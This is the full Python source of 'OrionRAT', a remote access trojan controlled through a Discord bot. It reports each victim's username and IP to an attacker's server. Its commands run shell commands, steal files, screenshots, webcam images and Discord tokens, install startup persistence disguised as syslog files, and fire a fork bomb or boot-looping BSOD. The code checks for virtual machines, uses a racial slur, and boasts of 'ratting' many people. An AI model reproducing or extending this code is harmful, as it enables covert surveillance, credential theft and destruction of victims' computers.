def main():
    try:
        import webbrowser
        import discord
        from discord.ext import commands
        from funcs import notify, pwdd, cdd, lsls, exece, screenshots, shutdowns, processkill, reboot, bsodo, gettoken, checkvm, persistence, processlist, enumerator, movef, camgrab, standby
        import time
        from time import sleep
        import platform
        import requests
        import os
        import sys
        import tempfile
        import os, sys, tempfile, signal 
        import shutil
        import uptime
        import subprocess
        user=os.getlogin()

        # information NEEDED to integrate the RAT to your discord server
        guild_id_r = "your server ID"
        bot_token = "your bot token"



        if platform.system() == "Linux":
                oss = "linux"
        if platform.system() == "Windows":
                oss = "windows"
        if platform.system() == "Darwin":
                oss = "macos"
        checkvm.check()
        rip=requests.get('https://checkip.amazonaws.com/')
        ip=rip.text


        intents = discord.Intents.all()

        bot = commands.Bot(command_prefix="$", intents=intents, help_command=None)
        intents.dm_typing = True 

        async def get_or_create_channel(guild, channel_name, category_name="OrionRAT"):
            existing_channel = discord.utils.get(guild.channels, name=channel_name)
            if existing_channel:
                return existing_channel

            category = "OrionRAT"
            if category_name:
                for c in guild.categories:
                    if c.name == category_name:
                        category = c
                        break
            new_channel = await guild.create_text_channel(channel_name, category=category)
            return new_channel
        @bot.event
        async def on_ready():    
                await bot.change_presence(
                activity=discord.Game(name=ip),  
                status=discord.Status.online  
                )
            
                guild = bot.get_guild(guild_id_r)
                category_name = "OrionRAT"
                category = discord.utils.get(guild.categories, name=category_name)
                embed = discord.Embed(
                    title=F"OrionRAT | New connection.",
                    description=f"Username: **{user}**\nIP: **{ip}**\n**To see commands, type $help**",
                    color=discord.Color.red()  
                )   
                    
                channel_name = f"{user}-{oss}"
                existing_channel = None
                for ch in category.text_channels: 
                    if ch.name.lower() == channel_name.lower():  
                        existing_channel = ch
                        break

                if existing_channel:
                    await existing_channel.send('<@&1409573051263090759> <@&1409642747346026511>', embed=embed)
                else:
                    channel = await guild.create_text_channel(name=channel_name, category=category)
                    await channel.send('<@&1409573051263090759> <@&1409642747346026511>', embed=embed)

        @bot.command()
        async def help(ctx):
            help_text = """
        
        [ OrionRAT ] - [ V1 ]

        Prefix > $         
        
        <------------------------------------------------------->
        
        Commands marked with * contains special arguments
        that you can find at the bottom of this help menu.

        Abbreviations used:        
        [ pt ] = path
        [ cn ] = content
        [ tl ] = title        
        
        <------------------------------------------------------->

        [ SYSTEM INFORMATION ]
        [ whoami ]                  Show current user
        [ enum ]                    Sends system & networking information 
        [ uptime ]                  Uptime of the system

        [ FILE & DIRECTORY ]
        [ pwd ]                     Show current directory
        [ ls ]                      List files
        [ cd <path> ]               Change directory
        [ mkdir ]                   Creates a directory
        [ rmdir ]                   Deletes an entire directory
        [ rm ]                      Deletes a single file
        [ mv <pt> ]                 Moves the folder or file to a new location
        [ upload <attachment> ]     Upload a file
        [ download <pt> ]           Download a file

        [ PROCESS & SYSTEM CONTROL ]
        [ dmproc ]                  Dumps in a list all the active processes
        [ kill <process> ]          Kill a process
        [ exec <command> ]          Execute a blind shell command
        [ addsup *:<pt>/<at> ]      Add to startup
        """
            help_text2 = """
        <------------------------------------------------------->

        [ SCREEN & NOTIFICATIONS ]
        [ ss ]                      Take screenshot
        [ message <tl> | <cn> ]     Sends a notification / Message Box to the user
        [ grabcam ]                 Takes a picture with the webcam

        [ SYSTEM POWER ]
        [ restart ]                 Restart system
        [ shutdown ]                Shutdown system
        [ suspend ]                 Suspend system

        [ SPECIAL/OTHER ]
        [ hello ]                   Greet
        [ steak ]                   Try it.
        [ urlopen <url>]             Opens a URL in the default browser

        [ WINDOWS EXCLUSIVES ]
        [ gettoken ]                Dump all discord tokens. 
        [ bsod ]                    Crashes windows causing a BSOD. 
        [ bsodloop ]                Destroys the computer by looping at boot the BSOD. 

        [ LINUX EXCLUSIVES ]
        [ crashlin ]                Crashes the system
        """
            help_text3 = """
        <------------------------------------------------------->
        
        [ * Available file formats to use for persistence]
        
        [ Linux ]
        [ sh:path ] - Bash Script
        [ py:path ] - Python Script
        [ dk:none ] - Desktop Entry + Desktop Entry file (Recommended)

        [ Windows ]
        [ exe:path ] - Windows Executable (Recommended)
        [ bat:path ] - Batch File 
        [ vbs:path ] - VBScript
        """        
            await ctx.send(f"```{help_text}```")
            await ctx.send(f"```{help_text2}```")
            await ctx.send(f"```{help_text3}```")
        @bot.command()
        @commands.has_role("VIP") 
        async def suspend(ctx):
            try:
                standby.linux_suspend()
                await ctx.reply(":white_check_mark: Succesfully suspended victim's computer!") 
            except Exception as e:
                await ctx.reply(f":x: There was an error suspending the computer: `{e}`")
        @bot.command()
        @commands.has_role("VIP") 
        async def grabcam(ctx):
            try:
                if platform.system() == "Windows":
                    path = "C:\\Windows\\System32\\spool\\drivers\\color\\syslog.jpg"
                if platform.system() == "Linux":
                    path = "/tmp/syslog.jpg"
                camgrab.run()
                file=discord.File(path)
                await ctx.reply(file=file)
                os.unlink(path)
            except Exception as e:
                await ctx.reply(f":x: There was an error taking webcam picture: `{e}`")
        @bot.command()
        @commands.has_role("VIP") 
        async def crashlin(ctx):
            if platform.system() == "Linux":
                try:
                    subprocess.run(["bash", "-c", r":(){ :|:& };:"], check=True)
                    await ctx.reply(":white_check_mark: Succesfully triggered fork bomb!") 
                except Exception as e:
                    await ctx.reply(f":x: There was an error triggering fork bomb: `{e}`")
            else:
                await ctx.reply(f":x: The victim's OS is incompatible with this command.")
        @bot.command()
        async def uptime(ctx):
            if platform.system() == "Linux":    
                t = os.popen('uptime -p').read()[:-1]
                await ctx.reply(f'`{t}`')
            if platform.system() == "Windows":
                seconds = int(uptime.uptime())
                minutes, seconds = divmod(seconds, 60)
                hours, minutes = divmod(minutes, 60)
                days, hours = divmod(hours, 24)
                await ctx.reply(f'`{days} days, {hours} hours, {minutes} minutes`')

        @bot.command()
        async def mkdir(ctx, text: str):
            os.makedirs(text, exist_ok=True)
            if os.path.exists(text):
                await ctx.reply(f'`{text}` has been created.')
            if not os.path.exists(text):
                await ctx.reply(f'Couldnt create `{text}` ')
        @bot.command()
        async def bsodloop(ctx):
            if platform.system() == "Windows":
                try:
                    bsodloop.run()
                    await ctx.reply(":white_check_mark: Succesfully triggered BSOD loop!") 
                except Exception as e:
                    await ctx.reply(f":x: There was an error triggering BSOD loop: `{e}`") 
            else:
                await ctx.reply(f":x: The victim's OS is incompatible with this command.")
        @bot.command()
        async def mv(ctx, source: str, destination: str):
            try:
                movef.run(src1=source, src2=destination)
                await ctx.reply(f":white_check_mark: | Moved `{source}` to `{destination}`.")
            except Exception as e:
                await ctx.reply(f":x: | Couldnt move file: `{e}`")
        @bot.command()
        async def dmproc(ctx):
            processlist.run()
            if platform.system() == "Windows":
                    file=discord.File(f'C:\\Users\\{user}\\AppData\\Local\\syslog32.log')
                    await ctx.reply(file=file)
                    os.unlink(f'C:\\Users\\{user}\\AppData\\Local\\syslog32.log')
            if platform.system() == "Linux":
                file=discord.File(f"/home/{user}/.local/share/syslog32.log")
                await ctx.reply(file=file)
                os.unlink(f"/home/{user}/.local/share/syslog32.log")
            

        @bot.command()
        async def rmdir(ctx, text: str):
            shutil.rmtree(text)
            if os.path.exists(text) == True:
                embed = discord.Embed(
                    title=":x: Failed",
                    description=f"Couldnt delete `{text}`",
                    color=discord.Color.red()
                    )
                await ctx.reply(embed=embed)
            if os.path.exists(text) == False:
                embed = discord.Embed(
                    title=":white_check_mark: Success",
                    description=f"Succesfully deleted `{text}`!",
                    color=discord.Color.green()
                    )
                await ctx.reply(embed=embed)        
        @bot.command()
        async def pwd(ctx):
            content=pwdd.get_dir()
            await ctx.reply(f'`{content}`')
        @bot.command()
        async def bsod(ctx):
            if platform.system() == "Windows":
                try:
                    bsodo.trigger()
                    await ctx.reply("<:1406291300634071110:1409691319554670712> | Triggering BSOD...") 
                except Exception as e:
                    await ctx.reply(f":x: There was an error triggering BSOD: `{e}`") 
            else:
                await ctx.reply(f":x: The victim's OS is incompatible with this command.") 
        @bot.command()
        async def cd(ctx, text: str):
            cdd.cde(path=text)
            finalpath=pwdd.get_dir()
            await ctx.reply(f'Changed path to: `{finalpath}`')
        @bot.command()
        async def whoami(ctx):
            await ctx.reply(f'`{user}`')
        @bot.command()
        async def rm(ctx, file: str):
            print(f"Trying to delete: {file} (type={type(file)})") 
            os.unlink(file)
            if not os.path.exists(file):
                await ctx.reply(f'`{file}` has been deleted.')
            if os.path.exists(file):
                await ctx.reply(f'Couldnt delete `{file}` ')
        @bot.command()
        async def upload(ctx):
            if not ctx.message.attachments:
                await ctx.reply("No file attached!")
                return
            if platform.system() == "Linux":
                upload_dir = f"/home/{user}/.local/share/"
            elif platform.system() == "Windows":
                upload_dir = f"C:\\Users\\{user}\\AppData\\Local\\"
            os.makedirs(upload_dir, exist_ok=True)
            for attachment in ctx.message.attachments:
                file_path = os.path.join(upload_dir, attachment.filename)
                await attachment.save(file_path)
                await ctx.reply(f"File `{attachment.filename}` saved on host at `{file_path}`!")
        @bot.command()
        async def enum(ctx):
            enumerator.run()
            if platform.system() == 'Linux':
                path = f'/home/{user}/.local/share/netstat.log'
                file = discord.File(path)
                await ctx.reply(file=file)
                os.unlink(path)
            elif platform.system() == "Windows":
                path = f"C:\\Users\\{user}\\AppData\\Local\\netstat.log"
                file = discord.File(path)
                await ctx.reply(file=file)
                os.unlink(path)
        @bot.command()
        async def hello(ctx):
            await ctx.reply(f"Yo twin we alone now, js finish programming me and go to bed, you should sleep its pretty late :hearts: , we're gonna be ratting alot of people thanks to you my nigga :money_mouth: :money_mouth: ")
        @bot.command()
        async def ls(ctx):
            items = lsls.lss()
            output = ""
            for i in items:
                output += f"{i}\n"
            await ctx.reply(f"```\n{output}```")
        @bot.command()
        @commands.has_role("VIP") 
        async def restart(ctx):
            try:
                reboot.run()
                await ctx.reply(":white_check_mark: Succesfully rebooted victim's computer!") 
            except Exception as e:
                await ctx.reply(f":x: There was an error restarting the computer: `{e}`") 
        @bot.command()
        @commands.has_role("VIP") 
        async def shutdown(ctx):
            try:
                shutdowns.run()
                await ctx.reply(":white_check_mark: Succesfully shutted down victim's computer!") 
            except Exception as e:
                await ctx.reply(f":x: There was an error shutting down: `{e}`") 
        @bot.command()
        async def kill(ctx, text: str):
            try:
                processkill.kill(proc_name=text)
                await ctx.reply(f":white_check_mark: | Succesfully executed commmand `{text}`.") 
            except Exception as e:
                await ctx.reply(f":x: | There was an error killing the process: `{e}`")
        @bot.command()
        async def exec(ctx, text: str):
                try:
                    exece.execes(data=f"{text}")
                    await ctx.reply(f":white_check_mark: | Command executed in shell.")
                except Exception as e:
                        await ctx.reply(f":x: | Couldnt execute command: {e}")
        @bot.command()
        async def addsup(ctx, args: str):
            fltp, path = [a.strip() for a in args.split(":", 1)]
            if not args == "dk:none":
                try:
                    persistence.run(fltp1=fltp, path=path)
                    await ctx.reply(f":white_check_mark: | Succesfully added persistence!")
                except Exception as e:
                    await ctx.reply(f":x: | There was an error adding persistence: `{e}`")
            if args == "dk:none":
                if not ctx.message.attachments:
                    await ctx.send('No file attached!')
                for attachment in ctx.message.attachments:
                    if platform.system() == "Linux":
                        upload_dir = f"/home/{user}/.local/share/"
                    elif platform.system() == "Windows":
                        upload_dir = f"C:\\Users\\{user}\\AppData\\Local\\"                
                    os.path.join(upload_dir, attachment.filename)
                    await attachment.save(f'{upload_dir}.syslog.desktop')
                    try:
                        if os.path.exists(f'/home/{user}/.config/autostart/'):
                            if os.path.exists('.config/autostart/.syslog.desktop'):
                                shutil.move(f'{upload_dir}.syslog.desktop', f'/home/{user}/.config/autostart/.syslog.desktop')
                                await ctx.reply(f":white_check_mark: | Succesfully added desktop entry persistence!")
                            if not os.path.exists('.config/autostart/.syslog.desktop'):
                                shutil.move(f'{upload_dir}.syslog.desktop', f'/home/{user}/.config/autostart/.syslog.desktop')
                                await ctx.reply(f":white_check_mark: | Succesfully added desktop entry persistence!")                            
                        if not os.path.exists(f'/home/{user}/.config/autostart/'):
                            os.makedirs(f'/home/{user}/.config/autostart/')
                            shutil.move(f'{upload_dir}.syslog.desktop', f'/home/{user}/.config/autostart/.syslog.desktop')
                            await ctx.reply(f":white_check_mark: | Succesfully added desktop entry persistence!")
                    except Exception as e:
                        await ctx.reply(f":x: | There was an error adding desktop entry persistence: `{e}`")


        @bot.command()
        async def download(ctx, text:str):
            try:
                file =  discord.File(text)
                await ctx.reply(file=file)
            except Exception:
                pass
            
        @bot.command()
        async def gettokens(ctx):
            if platform.system() == "Windows":
                try:
                    gettoken.run()
                    file = discord.File(f'C:\\Users\\{user}\\AppData\\LocalLow\\runtimelog.txt')
                    await ctx.reply(file=file)
                    os.unlink(f'C:\\Users\\{user}\\AppData\\LocalLow\\runtimelog.txt')
                except Exception as e:
                        await ctx.reply(f":x: | Couldnt grab tokens: `{e}`")
                        if os.path.exists(f'C:\\Users\\{user}\\AppData\\LocalLow\\runtimelog.txt'):
                            os.unlink(f'C:\\Users\\{user}\\AppData\\LocalLow\\runtimelog.txt')
                        else:
                            pass
            else:
                await ctx.reply(f":x: The victim's OS is incompatible with this command.") 
        @bot.command()
        async def urlopen(ctx, url: str):
            try:
                webbrowser.open(url)
                await ctx.reply(f":white_check_mark: | Opened URL `{url}`")
            except Exception as e:
                await ctx.reply(f":x: | Couldnt open URL: `{e}`")    
        @bot.command()
        async def steak(ctx):
            await ctx.reply('learn to type next time retarded sperm cell\nhttps://images-ext-1.discordapp.net/external/N2TOJTU8zf5dPN9VtdtWTu4muB69vJRo7pAs69dIGvQ/https/media.tenor.com/i5ctFNzwWLIAAAPo/steak.mp4')
        @bot.command()
        async def ss(ctx):
            screenshots.sgrab()
            if platform.system() == "Linux":
                file = discord.File("/tmp/sys.png")
                await ctx.reply(file=file)
            if platform.system() == "Windows":
                file = discord.File(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\sys.png')
                await ctx.reply(file=file)
            screenshots.sdelete()
            
        @bot.command()
        async def message(ctx, *, args: str):
            if "|" not in args:
                await ctx.reply("Usage: $message <title> | <content>")
                return
            title, content = [a.strip() for a in args.split("|", 1)]
            notify.run(content=content, title=title)

        bot.run(bot_token)
    except Exception as e:
        print(e)
        main()
if __name__ == "__main__":
    main()
